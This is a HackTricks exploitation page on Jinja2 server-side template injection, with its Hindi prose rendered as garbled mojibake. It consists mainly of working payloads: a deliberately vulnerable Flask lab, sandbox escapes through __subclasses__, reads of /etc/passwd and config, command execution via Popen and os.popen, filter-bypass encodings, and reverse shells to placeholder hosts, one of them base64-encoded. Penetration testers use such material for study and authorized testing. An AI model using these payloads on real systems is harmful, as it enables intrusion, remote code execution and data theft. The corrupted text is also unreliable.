# Jinja2 SSTI

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## **Lab**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **рд╡рд┐рд╡рд┐рдз**

### **рдбреАрдмрдЧ рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ**

рдпрджрд┐ рдбреАрдмрдЧ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ рдПрдХ `debug` рдЯреИрдЧ рдЙрдкрд▓рдмреНрдз рд╣реЛрдЧрд╛ рдЬреЛ рд╡рд░реНрддрдорд╛рди рд╕рдВрджрд░реНрдн рдХреЗ рд╕рд╛рде-рд╕рд╛рде рдЙрдкрд▓рдмреНрдз рдлрд┐рд▓реНрдЯрд░реНрд╕ рдФрд░ рдЯреЗрд╕реНрдЯреНрд╕ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрдЧрд╛ред рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ рдХрд┐ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдореЗрдВ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реИ рдмрд┐рдирд╛ рдбреАрдмрдЧрд░ рд╕реЗрдЯрдЕрдк рдХрд┐рдПред
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}





</pre>
```
### **рд╕рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдбрдВрдк рдХрд░реЗрдВ**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **Jinja рдЗрдВрдЬреЗрдХреНрд╢рди**

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, Jinja рдЗрдВрдЬреЗрдХреНрд╢рди рдореЗрдВ рдЖрдкрдХреЛ **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдЦреЛрдЬрдирд╛ рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рдпрдерди рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╡рд╛рд╣ рддрдХ рдкреБрдирдГ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреА рд╣реЛрддреА рд╣реИред рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **рдЙрди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ** рдЬреЛ **рдиреЙрди-рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ рд╣реЛрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реЗ рд╕реБрд▓рдн рд╣реЛрддреЗ рд╣реИрдВ**ред

### рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рддрдХ рдкрд╣реБрдБрдЪ

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреЛрдб `render_template("hello.html", username=username, email=email)` рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ username рдФрд░ email **рдиреЙрди-рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рдкрд╛рдпрдерди рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ рдЖрддреЗ рд╣реИрдВ** рдФрд░ **рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рдЕрдВрджрд░ рд╕реБрд▓рдн рд╣реЛрдВрдЧреЗ**ред\
\*\*\*\*рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рднреА рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ **рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ рд╣рдореЗрд╢рд╛ рд╕реБрд▓рдн рд╣реЛрдВрдЧреЗ**, рдпреЗ рд╣реИрдВ:
```
[]
''
()
dict
config
request
```
### \<class 'object'> рдХреА рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐

рдлрд┐рд░, рдЗрди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд╕реЗ рд╣рдореЗрдВ **`<class 'object'>`** рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрд░рд┐рднрд╛рд╖рд┐рдд **рдХреНрд▓рд╛рд╕реЗрд╕** рдХреА **рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХреЗрдВред рдЗрд╕рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рд╣рдо **`__subclasses__`** рдореЗрдердб рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдиреЙрди-рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб** рдкрд╛рдпрдерди рдПрдиреНрд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╕реЗ рд╕рднреА рдХреНрд▓рд╛рд╕реЗрд╕ рддрдХ **рдкрд╣реБрдВрдЪ** рд╕рдХрддреЗ рд╣реИрдВред

рдЙрд╕ **рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓рд╛рд╕** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ **рдХреНрд▓рд╛рд╕ рдСрдмреНрдЬреЗрдХреНрдЯ** рддрдХ **рдкрд╣реБрдВрдЪрдирд╛** рд╣реЛрдЧрд╛ рдФрд░ рдлрд┐рд░ **`__base__`**, **`__mro__()`[-1]** рдпрд╛ `.`**`mro()[-1]`** рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╣реЛрдЧрд╛ред рдФрд░ рдлрд┐рд░, рдЗрд╕ **рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓рд╛рд╕** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ **рдмрд╛рдж** рд╣рдо **`__subclasses__()`** рдХреЛ **рдХреЙрд▓** рдХрд░рддреЗ рд╣реИрдВред

рдЗрди рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рджреЗрдЦреЗрдВ:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE рдПрд╕реНрдХреЗрдкрд┐рдВрдЧ

**рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж** `<class 'object'>` рдФрд░ `__subclasses__` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рдЕрдм рдЙрди рдХреНрд▓рд╛рд╕реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╛рдЗрд▓реЗрдВ рдкрдврд╝ рдФрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

`__subclasses__` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рд╣рдореЗрдВ **рд╕реИрдХрдбрд╝реЛрдВ рдирдП рдлрдВрдХреНрд╢рдиреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдЕрд╡рд╕рд░ рдорд┐рд▓рд╛ рд╣реИ**, рд╣рдо **рдлрд╛рдЗрд▓ рдХреНрд▓рд╛рд╕ рддрдХ рдкрд╣реБрдВрдЪрдХрд░** рдлрд╛рдЗрд▓реЛрдВ рдХреЛ **рдкрдврд╝рдиреЗ/рд▓рд┐рдЦрдиреЗ** рдХреЗ рд▓рд┐рдП рдпрд╛ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рд╕ рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдЦреБрд╢ рд╣реЛрдВрдЧреЗ рдЬреЛ рдХрдорд╛рдВрдбреНрд╕ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЬреИрд╕реЗ `os`).

**рд░рд┐рдореЛрдЯ рдлрд╛рдЗрд▓ рдкрдврд╝рдирд╛/рд▓рд┐рдЦрдирд╛**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
рдЖрдк **рдФрд░ рдЕрдзрд┐рдХ рдХрдХреНрд╖рд╛рдУрдВ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдк **рдмрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк **рдЬрд╛рдВрдЪ** рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### рдлрд┐рд▓реНрдЯрд░ рдмрд╛рдпрдкрд╛рд╕

#### рд╕рд╛рдорд╛рдиреНрдп рдмрд╛рдпрдкрд╛рд╕

рдпреЗ рдмрд╛рдпрдкрд╛рд╕ рд╣рдореЗрдВ рдХреБрдЫ рд╡рд░реНрдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ **рдЧреБрдгреЛрдВ** рддрдХ **рдкрд╣реБрдВрдЪ** рдкреНрд░рджрд╛рди рдХрд░реЗрдВрдЧреЗред\
рд╣рдо рдкрд╣рд▓реЗ рд╣реА рдЗрди рдмрд╛рдпрдкрд╛рд╕реЛрдВ рдореЗрдВ рд╕реЗ рдХреБрдЫ рдХреЛ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рджреЗрдЦ рдЪреБрдХреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЖрдЗрдП рдЙрдиреНрд╣реЗрдВ рдпрд╣рд╛рдВ рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рдмрддрд╛рддреЗ рд╣реИрдВ:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**рдЕрдзрд┐рдХ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдВ рд╡рд╛рдкрд╕ рдЖрдПрдВ рдЬреЛ рдПрдХ рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ**](jinja2-ssti.md#accessing-global-objects)
* [**рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓рд╛рд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдВ рд╡рд╛рдкрд╕ рдЖрдПрдВ**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрдврд╝реЗрдВ рдмрд┐рдирд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓рд╛рд╕ рдХреЗ**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTML рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рд╕реЗ рдмрдЪрдирд╛**

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Flask рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдХреЛ HTML рдПрдиреНрдХреЛрдб рдХрд░рддрд╛ рд╣реИ:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`** рдлрд╝рд┐рд▓реНрдЯрд░ рд╣рдореЗрдВ JavaScript рдФрд░ HTML рдХреЛ рдкреЗрдЬ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ **рдмрд┐рдирд╛** рдЗрд╕реЗ **HTML encoded** рдХрд┐рдП, рдЗрд╕ рдкреНрд░рдХрд╛рд░:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**рдПрдХ рджреБрд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдХрд░ RCE.**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## рдХрдИ рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд┐рдирд╛

**`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`** рдХреЗ рдмрд┐рдирд╛
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}



```
## Jinja рдЗрдВрдЬреЗрдХреНрд╢рди рдмрд┐рдирд╛ **\<class 'object'>**

[**рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕**](jinja2-ssti.md#accessing-global-objects) рд╕реЗ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ **RCE рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдЙрд╕ рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ред**\
рдпрджрд┐ рдЖрдк рдЙрди рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА **рдлрдВрдХреНрд╢рди** рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **`__globals__.__builtins__`** рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд╣рд╛рдБ рд╕реЗ **RCE** рдмрд╣реБрдд **рд╕рд░рд▓** рд╣реИред

рдЖрдк **рдлрдВрдХреНрд╢рдиреНрд╕ рдвреВрдБрдв рд╕рдХрддреЗ рд╣реИрдВ** рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ **`request`**, **`config`** рдФрд░ рдХрд┐рд╕реА рднреА **рдЕрдиреНрдп** рджрд┐рд▓рдЪрд╕реНрдк **рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ** рд╕реЗ рдЬрд┐рд╕ рддрдХ рдЖрдкрдХреА рдкрд╣реБрдБрдЪ рд╣реЛ:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдХреБрдЫ functions рдкрд╛ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк builtins рдХреЛ рдЗрд╕рдХреЗ рд╕рд╛рде рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## рд╕рдВрджрд░реНрдн

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯреЗрдб рдЪрд╛рд░реНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [attr trick рдпрд╣рд╛рдБ рджреЗрдЦреЗрдВ](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>
